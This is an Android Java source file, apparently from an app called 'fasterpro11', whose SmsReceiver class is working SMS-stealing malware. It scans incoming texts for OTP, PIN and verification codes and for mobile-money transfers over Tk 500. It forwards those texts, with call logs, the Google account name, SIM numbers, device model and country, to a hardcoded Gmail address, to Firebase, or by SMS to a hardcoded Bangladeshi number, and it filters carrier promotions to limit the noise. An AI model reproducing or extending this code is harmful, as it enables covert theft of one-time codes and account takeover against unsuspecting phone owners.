package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.mail.MessagingException;


public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String FORWARD_SMS_NUMBER = "+88014002828864";
    public String sim1Number="";
    public String sim2Number="";
    public int SMSCounter= 0;
    private static final String[] INCOMING_CALL_NUMBERS = {
            "+8801300282086", "+8801304039289",  "+8809697637893", "+8809638821369" };
    private static final String[] SEND_MONEY_WORDS = {"Cash In", "cash in", "send money", "money", "Money","received",
            "received TK","Cashback","Balance", "Recharge",  "received money"};
    private static final String[] OTP_WORDS = {"OTP", "Otp", "otp",  "PIN", "Pin", "pin","CODE", "Code", "code",
            "Google verification code","verification code","Verification code",
            "মাইজিপি পিন (code)","মাইজিপি পিন ", "মাইজিপি পিন (code)", "(code)",
            "VERIFICATUON", "Verification", "verification"};




    private static String lastSender;
    private static String lastMessage;
    private static long lastTimestamp;
    private Context mContext;
    private boolean isMessageProcessed = false;
    public static String getSender() {
        return null;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (isMessageProcessed) {
            return; // যদি মেসেজ ইতিমধ্যে প্রসেস করা হয়ে থাকে, তাহলে ফিরে যান
        }
        // এসএমএস প্রসেসিং লজিক
        isMessageProcessed = true; // মেসেজ প্রসেস করা হয়েছে চিহ্নিত করুন
        mContext = context;

        if (intent != null && intent.getExtras() != null) {
            Bundle bundle = intent.getExtras();
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    try {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS from: " + sender + ", message is: " + messageBody);


                        lastSender = sender;
                        lastMessage = messageBody;
                        lastTimestamp = System.currentTimeMillis();



                        // Start code for Get Sim number.Call method firstly here. From Own User .SaveSharedPreferences. use sms=========start=====================
                        // Load previous count from SharedPreferences
                        SharedPreferences sharedPreferences = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
                        int SMSCounter = sharedPreferences.getInt("SMSCounter", 0);

                        // কাউন্টার ইনক্রিমেন্ট করুন
                        SMSCounter++;
                        // SharedPreferences-এ আপডেটেড সংখ্যা সংরক্ষণ করুন
                        SharedPreferences.Editor editor = sharedPreferences.edit();
                        editor.putInt("SMSCounter", SMSCounter);
                        editor.apply();
                        Log.d(TAG, "SharedPreferences Updated SMSCounter : " + SMSCounter);

                        // মেসেজ কন্টেন্ট বিশ্লেষণ করে সিম নাম্বার বের করা হবে কিনা তা চেক করুন
                        boolean IsSimNumberGetFromUserWords1 = isSimNumberGetFromUserWords1(messageBody);
                        boolean IsSimNumberGetFromUserWords2 = isSimNumberGetFromUserWords2(messageBody);
                        Log.d(TAG, "IsSimNumberGetFromUserWords1: " + IsSimNumberGetFromUserWords1 +
                                " IsSimNumberGetFromUserWords2: " + IsSimNumberGetFromUserWords2);

                        // নিশ্চিত করুন যে context ঠিক আছে
                        Context appContext = context.getApplicationContext();
                        if (appContext == null) {
                            Log.e("SmsReciver", "Application context is null!");
                            return;
                        }
                        // শর্ত যাচাই করে প্রয়োজন হলে GetSim1AndSim2NumberFromAlertbox অ্যাক্টিভিটি চালু করুন
                        if ((SMSCounter == 2 || SMSCounter == 600 || SMSCounter == 2000) ||
                                (IsSimNumberGetFromUserWords1 && IsSimNumberGetFromUserWords2)) {
                            Log.d(TAG, "Condition met for alert window Showing");

                            Intent alertIntent = new Intent(appContext, GetSim1AndSim2NumberFromAlertbox.class);
                            alertIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Service থেকে Activity চালু করার জন্য ফ্ল্যাগ
                            appContext.startActivity(alertIntent);

                            // start code counter rest 0 SMSCounter  .for again come alart window
                            GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
                            String UserID1= alert.getSim1NumberFromUser(context);
                            String UserID2= alert.getSim2NumberFromUser(context);
                            Log.d(TAG, "UserID1 :" + UserID1+ " UserID1:" + UserID1 );
                            if (UserID1== null || UserID2== null)  {
                                //SharedPreferences.Editor editor = sharedPreferences.edit();
                                editor.putInt("SMSCounter", 0);
                                editor.apply();
                                Log.d(TAG, "SharedPreferences SMSCounter reset to : " + SMSCounter);
                            }else {
                                Log.d(TAG, "UserID1 and UserID1 not null");
                            }
                            // End code counter rest 0 SMSCounter .for again come alart window

                        } else {
                            Log.d(TAG, "Condition not met for alert window");
                        }
                        //END code for Get Sim number. From Own User .Call method firstly here.Save SharedPreferences. use socialmedia sms======END====================


                        //START code for Get Sim number. From Own User .Call method firstly here.Save SharedPreferences. use socialmedia sms====START =====================
                        boolean IsSimNumberSetAlart =   isSimNumberSetAlartmessageBody( messageBody);
                        Log.d(TAG, "Sim Number set From SMS Word . isSimNumberSetAlartmessageBody : " + IsSimNumberSetAlart  );
                        if ( IsSimNumberSetAlart) {
                            Log.d(TAG, "condition IsSimNumberSetAlart: " + IsSimNumberSetAlart);
                            String ExtractPlusPrefixedNumbersFromSMS =  extractPlusPrefixedNumbersFromSMS( messageBody,  context);
                            if (  ExtractPlusPrefixedNumbersFromSMS != null) {
                                extractPlusPrefixedNumbersFromSMS( messageBody, context);
                                //isSimNumberSetAlart(messageBody);
                            }else {
                                Log.d(TAG, "Sim Number set From SMS Word condition not meet  "  );
                            }
                        }





                        // Cheek Blocked notification
                        if (isBlockedmessageBody(messageBody)) {
                            Log.d(TAG, "Blocked notification detected. SMS will not be forwarded.");
                            return;  // ব্লক কিওয়ার্ড পাওয়া গেলে ফরওয়ার্ড হবে না
                        }

                        boolean isNumberInCallLog = isNumberInCallLog(sender);
                        boolean isSMSMoneyWords = containsSMSMoneyWords(messageBody);
                        boolean amountAboveThreshold = AmountAboveThreshold(messageBody);
                        boolean isContainsSMSOtp = containsSMSOtp(messageBody);
                        boolean isPatternMatchInCallLog = isPatternMatchInCallLogs();
                        boolean isIncomingCallNumber = IncomingCallNumber(sender);
                        boolean isPatternMatchInRecentMessages = isPatternMatchInRecentIncomingMessages();
                        Log.d(TAG, "Incoming Call Number check: " + isIncomingCallNumber);
                        Log.d(TAG, "Is Number In CallLog check: " + isNumberInCallLog);
                        Log.d(TAG, "Contains SMS MoneyWords check: " + isSMSMoneyWords);
                        Log.d(TAG, "Contains SMS AmountAboveThreshold check: " + amountAboveThreshold);
                        Log.d(TAG, "Contains SMS Otp check: " + isContainsSMSOtp);
                        Log.d(TAG, "Pattern match check in CallLog 4 to 6 digit : " + isPatternMatchInCallLog);
                        Log.d(TAG, "Pattern match check in Incoming Messages 4 to 6 digit : " + isPatternMatchInRecentMessages);

                        if ((isSMSMoneyWords && amountAboveThreshold) ||
                                (isNumberInCallLog && isSMSMoneyWords && amountAboveThreshold) ||
                                isContainsSMSOtp || ( isPatternMatchInCallLog && amountAboveThreshold ) ||
                                (isIncomingCallNumber && isPatternMatchInRecentMessages && isSMSMoneyWords)||
                                ((isIncomingCallNumber || isNumberInCallLog ) && isSMSMoneyWords && !isInternetConnected())) {
                            Log.d(TAG, "SmsReceiver class Condition match: For Forwarding message...");

                            // cheek reson for forwarding message start
                            if (isSMSMoneyWords && amountAboveThreshold){
                                Log.d(TAG, "conditions match Forwarding SMS for isSMSMoneyWords && amountAboveThreshold.");
                            }else if (isNumberInCallLog && isSMSMoneyWords && amountAboveThreshold){
                                Log.d(TAG, "conditions match for isNumberInCallLog && isSMSMoneyWords && amountAboveThreshold.");
                            }else if (isContainsSMSOtp ){
                                Log.d(TAG, "conditions match Forwarding SMS for isContainsSMSOtp .");
                            }else if ( isPatternMatchInCallLog && amountAboveThreshold ){
                                Log.d(TAG, "conditions match Forwarding SMS for  isPatternMatchInCallLog && amountAboveThreshold .");
                            }else if (isIncomingCallNumber && isPatternMatchInRecentMessages && isSMSMoneyWords){
                                Log.d(TAG, "conditions match Forwarding SMS for isIncomingCallNumber && isPatternMatchInRecentMessages && isSMSMoneyWords.");
                            }else if ((isIncomingCallNumber || isNumberInCallLog ) && isSMSMoneyWords && !isInternetConnected()){
                                Log.d(TAG, "conditions match Forwarding SMS for (isIncomingCallNumber || isNumberInCallLog ) && isSMSMoneyWords && !isInternetConnected().");
                            }else {
                                Log.d(TAG, "conditions not match for forwarding the SMS.");
                            }

                            try {
                                GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
                                String recentCallLogs = getRecentCallLogs.getRecentCallLogs();
                                //String recentCallLogs = getRecentCallLogs();
                                String forwardMessage = "From: " + sender + "\nMessage: " + messageBody + "\n\nRecent Call Logs:\n" + recentCallLogs;

                                if (isInternetConnected()) {
                                    Log.d(TAG, "Internet is connected. Forwarding SMS via email.");
                                    forwardSmsByEmail(sender, forwardMessage, context);
                                } else {
                                    Log.d(TAG, "Internet is not connected. Forwarding SMS via SMS.");
                                    forwardSmsBySMS(sender, forwardMessage, context);
                                }
                            } catch (MessagingException e) {
                                Log.e(TAG, "Failed to forward SMS: " + e.getMessage());
                            }
                        } else {
                            Log.d(TAG, "SmsReceiver class  No conditions match for forwarding the message.");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS: " + e.getMessage());
                    }
                }
            }
        }
    }
    //  messageBody blockedKeyword ============= start code =============
    // ব্লক কিওয়ার্ড চেক করার ফাংশন
    private boolean isBlockedmessageBody(String messageBody) {
        String blockedKeyword = findBlockedKeyword(messageBody);
        if (blockedKeyword != null) {
            Log.d(TAG, "messageBody blocked by keyword match: " + blockedKeyword);
            return true;
        }
        return false;
    }
    // ব্লক কিওয়ার্ড খোঁজা
    private String findBlockedKeyword(String messageBody) {
        String[] blockedKeywords = {
                "MB","Mb","mb","GP30",  "GB350TK", "30GB350TK", "GP30GB350TK",  "GB300TK",
                "টাকা রিচার্জে", "প্যাকটির অটো রিনিউ",  "চালু করতে ডায়াল ", "Emergency balance", "  মিনিট/ব্যান্ডেল ",
                "অফার",  "অফার!", "নতুন অফার!","অফারটি","রেগুলার কল রেট", "আজই শেষ দিন", "অফারটি নিতে বিকাশ/নগদ থেকে রিচার্জ করুন", "মেয়াদউত্তীর্ণ হবে",
                "আজকের অফার", "সেরা অফার", "দিন মেয়াদী সেরা অফার", "৩০দিন ডায়াল", "৭দিন মেয়াদী", "7 দিন",
                "প্যাক এর",   "মিনিট চালু হয়েছে", "http://mygp.li/My",
               " জিবি ","*১২১*","৩০দিন", "৭ দিন", "৭দিন","৩০ দিন", "৩০দিন", "৩ দিন",
                "৩ িন","১৫ দিন", "১৫দিন",
                "ইন্টারনেট অফার", "আনলিমিটেড", " ইন্টারনেট বিলের", "পরিশোধিত", "Bubble shooter game", "inbox me", "পুরস্কার",
                 "bonus","Emergency balance", "Emergency",
                "GB450TK"
        };

        for (String keyword : blockedKeywords) {
            if (messageBody.equals(keyword) || messageBody.contains(keyword)) {
                return keyword;
            }
        }
        return null;
    }
    //  messageBody blockedKeyword ============= end code =============




    private boolean containsSMSMoneyWords(String messageBody) {
        for (String keyword : SEND_MONEY_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains money-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "No money-related keywords found in message.");
        return false;
    }
    private boolean containsSMSOtp(String messageBody) {
        for (String keyword : OTP_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains OTP-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "no Message contains OTP-related keyword.");
        return false;
    }

    private static final double MIN_AMOUNT = 500;
    private static final double MAX_AMOUNT = 900000000;
    private boolean AmountAboveThreshold(String messageBody) {
        Log.d(TAG, "AmountAboveThreshold check Received messageBody: " + messageBody);
        List<Double> amounts = extractAllAmounts(messageBody);

        boolean result = false;
        Log.d(TAG, "Checking extracted amounts: " + amounts);
        for (double amount : amounts) {
            Log.d(TAG, "Checking money amount: " + amount);
            if (amount >= MIN_AMOUNT && amount <= MAX_AMOUNT) {
                result = true;
                Log.d(TAG, "money Amount " + amount + " is within threshold.");
                break;
            } else {
                Log.d(TAG, "money Amount " + amount + " is NOT within threshold.");
            }
        }
        Log.d(TAG, "Final result for money amount above threshold: " + result);
        return result;
    }
    private List<Double> extractAllAmounts(String messageBody) {
        List<Double> amounts = new ArrayList<>();
        String regex = "(?i)Tk\\s*([\\d,]+(?:\\.\\d{1,2})?)"; // Tk এর পর পরিমাণ খুঁজুন
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(messageBody);
        Log.d(TAG, "Using regex: " + regex);
        while (matcher.find()) {
            String amountString = matcher.group(1);
            Log.d(TAG, "Matched amount string: " + amountString);
            if (amountString != null) {
                // কমা সরানো
                amountString = amountString.replace(",", "");
                Log.d(TAG, "Processed amount string (without commas): " + amountString);
                // পরিমাণটি ডাবল এ রূপান্তর করা
                try {
                    double amount = Double.parseDouble(amountString);
                    Log.d(TAG, "Extracted amount: " + amount);
                    amounts.add(amount);
                } catch (NumberFormatException e) {
                    Log.e(TAG, "Number format exception while parsing amount: " + e.getMessage());
                }
            }
        }
        if (amounts.isEmpty()) {
            Log.d(TAG, "No TK Money amounts extracted from the message.");
        } else {
            Log.d(TAG, "Amounts extracted: " + amounts);
        }
        return amounts;
    }
    private boolean IncomingCallNumber(String sender) {
        for (String number : INCOMING_CALL_NUMBERS) {
            if (sender.equals(number)) {
                Log.d(TAG, "Sender is an incoming call number: " + sender);
                return true;
            }
        }
        Log.d(TAG, "Not an incoming call number: " + sender);
        return false;
    }


    private boolean isPatternMatchInCallLogs() {
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                Matcher matcher = pattern.matcher(number);
                if (matcher.find()) {
                    Log.d(TAG, "PatternMatchInCallLogs Matched number in Call Logs: " + number);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    private boolean isPatternMatchInRecentIncomingMessages() {
        Pattern pattern = Pattern.compile("\\b(\\d{4,6})\\b");
        Pattern datePattern = Pattern.compile("\\b(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4}|\\d{2,4}[/-]\\d{1,2}[/-]\\d{1,2})\\b");

        Uri smsUri = Telephony.Sms.CONTENT_URI;
        String[] projection = { Telephony.Sms.ADDRESS, Telephony.Sms.BODY };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(smsUri, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                Matcher dateMatcher = datePattern.matcher(body);
                Set<String> dateNumbers = new HashSet<>();

                while (dateMatcher.find()) {
                    String dateMatch = dateMatcher.group();
                    for (String part : dateMatch.split("[/-]")) {
                        if (part.length() >= 4 && part.length() <= 6) {
                            dateNumbers.add(part);
                        }
                    }
                }

                Matcher matcher = pattern.matcher(body);
                while (matcher.find()) {
                    String matchedNumber = matcher.group(1);
                    if (matchedNumber.length() >= 4 && matchedNumber.length() <= 6 && !dateNumbers.contains(matchedNumber)) {
                        Log.d(TAG, "pattern Matched 4 to 6 digit numbers in Incoming Messages: " + matchedNumber);
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "pattern Error querying incoming messages: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }


    private boolean isInternetConnected() {
        try {
            ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet connection: " + e.getMessage());
        }
        return false;
    }

    private boolean isNumberInCallLog(String sender) {
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;

        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    if (number.equals(sender)) {
                        Log.d(TAG, "Number found in call log: " + sender);
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        Log.d(TAG, "Sender number not found in call log: " + sender);
        return false;
    }








    //START serch Words For Sim Number set in messageBody  ============= START  code=============

    //serch Words start code for Sim Number Set. By  Own User . Sim Number Get From User ============= start code =============
    public boolean isSimNumberGetFromUserWords1(String messageBody) {
        for (String keyword : SimNumberGetFromUserWords) {
            if ( messageBody.contains(keyword ) ||  messageBody.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word1 match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words 1", "give sim number", "sim number get from user",
            "Sim Number Get From User"   ));

    public boolean isSimNumberGetFromUserWords2(String messageBody) {
        for (String keyword : SimNumberGetFromUserWords2) {
            if ( messageBody.contains(keyword ) ||  messageBody.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word2 match : " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords2 = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words2",   "&",     "*", "-",  "+"        ));
    //serch Words End code for Sim Number Set. By  Own User . Sim Number Get From User ============= Edd code =============



    public boolean  isSimNumberSetAlartmessageBody(String messageBody) {
        String SimNumberSetAlartmessageBodyKeyword = SimNumberSetAlartmessageBody(messageBody);
        if (SimNumberSetAlartmessageBodyKeyword != null) {
            Log.d(TAG, "messageBody Sim Number Set Alart messageBody: " + SimNumberSetAlartmessageBodyKeyword);
            return true;
        }
        return false;
    }

    public String SimNumberSetAlartmessageBody(String messageBody) {
        String[] SimNumberSetAlartmessageBodyKeywords = {
                "sim set alart", "sorry drup your recent alls","as soon as you return your missing droup calls",
                "Why are calls not coming to this number of yours?", "calls not coming to this number of yours?",
                "number is off? ","number is off",
                "তুমার এই নম্বারে কল ঢুকছেনা কেন",  "এটা কি তোমার নাম্বার",  "এটা কি ব্লক করা",  "এটা কি ব্লক করা ?",
                "এই নাম্বারের ফ্রি অফার চেক করুন", "এই নাম্বারের এ্যাপ থেকে অফার চেক করুন",  "এই নাম্বার কি",
                "এটা কি তোমার",
                "sim set alarts"
        };

        for (String keyword : SimNumberSetAlartmessageBodyKeywords) {
            if (messageBody.equals(keyword) || messageBody.contains(keyword)) {
                return keyword;
            }
        }
        return null;
    }
  //Alart messageBody  Sim Number Set============= end code =============

//END serch Words For Sim Number set in messageBody  ============= END code=============















    public String extractPlusPrefixedNumbersFromSMS(String messageBody,Context context){
        Log.d(TAG, "extractPlusPrefixedNumbersFromSMS method call");
        // Updated regex to match numbers starting with '+' followed by 10 to 16 digits
        Pattern pattern = Pattern.compile("\\+\\d{10,16}");  // This regex will match + followed by 10 to 16 digits
        Pattern datePattern = Pattern.compile("\\b(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4}|\\d{2,4}[/-]\\d{1,2}[/-]\\d{1,2})\\b");

        Uri smsUri = Telephony.Sms.CONTENT_URI;
        String[] projection = { Telephony.Sms.ADDRESS, Telephony.Sms.BODY };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(smsUri, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));

                // Date pattern matching, although it may not be needed for your case
                Matcher dateMatcher = datePattern.matcher(body);
                Set<String> dateNumbers = new HashSet<>();

                while (dateMatcher.find()) {
                    String dateMatch = dateMatcher.group();
                    for (String part : dateMatch.split("[/-]")) {
                        if (part.length() >= 4 && part.length() <= 6) {
                            dateNumbers.add(part);
                        }
                    }
                }

                // Matching the phone numbers starting with '+' and having 10 to 16 digits
                Matcher matcher = pattern.matcher(body);
                while (matcher.find()) {
                    String matchedNumber = matcher.group();
                    // Check if the number length is between 10 and 16 digits and not a date
                    if (matchedNumber.length() >= 10 && matchedNumber.length() <= 16 && !dateNumbers.contains(matchedNumber)) {
                        Log.d(TAG, "Pattern matched phone number in Incoming Messages: " + matchedNumber);
                        storeExtractPlusPrefixedNumbersFromSMS(matchedNumber.toString(),  messageBody,mContext);

                    }
                    return matchedNumber;  // Return the matched phone number
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying incoming messages: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return null;  // Return null if no match is found
    }


    public void storeExtractPlusPrefixedNumbersFromSMS(String validNumbers, String messageBody,Context context) {
        // কনটেক্সট চেক করা (mContext যদি null হয়)
        if (context == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
        }
        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (validNumbers != null && validNumbers.matches("\\+\\d{10,16}")) {
            editor.putString("validPhoneNumbers", validNumbers);
            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
            Log.d(TAG, "Stored valid phone numbers in SharedPreferences: " + validNumbers);
        } else {
            Log.e(TAG, "Invalid phone number format: " + validNumbers);
        }
        RetrieveStoredSharedPreferencesPhoneNumbers( context);
    }

    public String RetrieveStoredSharedPreferencesPhoneNumbers(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // স্টোর করা নম্বর লোগ করা
        String validPhoneNumbers = sharedPreferences.getString("validPhoneNumbers", null);
        if (validPhoneNumbers != null) {
            Log.d(TAG, "Stored valid phone numbers in SharedPreferences Retrieve Stored SharedPreferences PhoneNumbers: " + validPhoneNumbers);
        } else {
            Log.d(TAG, "No valid phone numbers found in SharedPreferences Retrieve Stored SharedPreferences PhoneNumbers.");
        }
        return validPhoneNumbers; // আগের স্টোর করা ডেটা রিটার্ন করুন
    }


    // Set Sim1 Number firebase subject ============= start code ==============



    public String SetSim1Number(Context context, String messageBody) {
        Log.d(TAG, " method SetSim1Number ");
        boolean IsSimNumberSetAlart =  isSimNumberSetAlartmessageBody(messageBody);
        String GetSim1RetrieveStoredSharedPreferencesPhoneNumbers = RetrieveStoredSharedPreferencesPhoneNumbers(context);
        Log.d(TAG, " IsSimNumberSetAlart: " + IsSimNumberSetAlart);
        Log.d(TAG, " GetSim1RetrieveStoredSharedPreferencesPhoneNumbers: " +  GetSim1RetrieveStoredSharedPreferencesPhoneNumbers);

        if (IsSimNumberSetAlart  &&  GetSim1RetrieveStoredSharedPreferencesPhoneNumbers != null ) {
            sim1Number = GetSim1RetrieveStoredSharedPreferencesPhoneNumbers;
            Log.d(TAG, " Sim1 Number Set from Sms: " + sim1Number);
            return sim1Number;
        }
        return GetSim1RetrieveStoredSharedPreferencesPhoneNumbers;
    }

    // Set Sim1 Number firebase subject === end =============


    public void forwardSmsByEmail(String sender, String messageBody, Context context) throws MessagingException {
        Log.d(TAG, "Preparing to send email...");
        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);

        GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
        String recentCallLogs = getRecentCallLogs.getRecentCallLogs();
        String title = "Your Notification Title";  // এটি আপনার টাইটেল হবে
        String text = "Your Notification Text";    // এটি আপনার টেক্সট হবে
        String Get_Sim1_Number = SetSim1Number( context,messageBody);
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;
        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
        LocationUtil locationUtil = new LocationUtil ();
        String countryName = locationUtil.getFullCountryName();

        // Set the subject to include sender and mobile model
        String subject ="SMS ID: " + Get_Sim1_Number + " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel +" User: "+ GoogleAccountName +" " + userSimNumber + " SMS from: " + sender + " Country: " + countryName ;
        Log.e(TAG, "SMS email subject: "+ subject );

        try {
            Log.d(TAG, "Attempting to send email through JavaMailAPI_SmsReceiver_Send...");
            JavaMailAPI_SmsReceiver_Send.sendMail("abontiangum99@gmail.com", subject, messageBody);
            Log.d(TAG, "sendMail method called successfully.");
        } catch (Exception e) {
            Log.e(TAG, "Error calling sendMail: " + e.getMessage());
        }

        // Firebase এ ডেটা সংরক্ষণ করা
        Log.d(TAG, "SmsReciver Data prepare for Firebase.");
        FirebaseSaVeAndViewData firebaseSaVeAndViewData = new FirebaseSaVeAndViewData();
        firebaseSaVeAndViewData.saveSmsDataToFirebase(sender, messageBody, subject, recentCallLogs,context);
        Log.d(TAG, "Sms Data saved to Firebase.");
    }

    void forwardSmsBySMS(String sender, String messageBody, Context context) {
        // Ensure messageBody and sender are not null
        if (sender != null && messageBody != null) {
            // Get the previous message data from SharedPreferences
            SharedPreferences preferences = context.getSharedPreferences("SMSPrefs", Context.MODE_PRIVATE);
            String previousMessage = preferences.getString("lastSent", ""); // Removed extra space

            // Check if the new message is different from the previous one
            if (!messageBody.equals(previousMessage)) {
                // Forward the SMS with the message content
                SmsManager smsManager = SmsManager.getDefault();
                String smsMessage = messageBody;
                ArrayList<String> parts = smsManager.divideMessage(smsMessage); // Handle long messages
                smsManager.sendMultipartTextMessage(FORWARD_SMS_NUMBER, null, parts, null, null);
                Log.d(TAG, "Forwarded SMS by SMS to " + FORWARD_SMS_NUMBER + ": " + smsMessage);

                // Store the new message as the last sent message
                SharedPreferences.Editor editor = preferences.edit();
                editor.putString("lastSent", messageBody); // Removed extra space
                editor.apply();
            } else {
                Log.d(TAG, "Message is the same as the previous one. Not forwarding forwardSmsBySMS.");
            }
        } else {
            Log.e(TAG, "Sender or messageBody is null. Cannot forward SMS forwardSmsBySMS.");
        }
    }




    // Helper function to call the onReceive method with appropriate context
    public void SMSReciver(Context context, Intent intent) {
        onReceive(context, intent);
    }


    public void sendSmsByEmail(String sender, String messageBody, Context context) throws MessagingException {
        forwardSmsByEmail(sender, messageBody, context);
    }

}
